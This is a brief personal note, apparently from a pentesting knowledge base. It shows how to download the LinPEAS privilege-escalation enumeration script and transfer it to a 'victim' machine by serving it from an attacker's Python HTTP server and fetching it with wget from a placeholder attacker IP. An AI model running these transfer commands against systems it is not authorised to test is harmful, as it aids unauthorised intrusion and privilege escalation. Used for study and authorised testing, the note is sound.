Tags: [[Linpeas]] [[Cybersecurity]] [[Cyber Tool]]


## Download Linpeas

```Bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

```

## Transfer Linpeas to target

```Bash
# On Attacker Machine
python3 -m http.server 8000
```

```Bash
# On victim 
wget http://{Your-IP:PORT}/linpeas.sh
```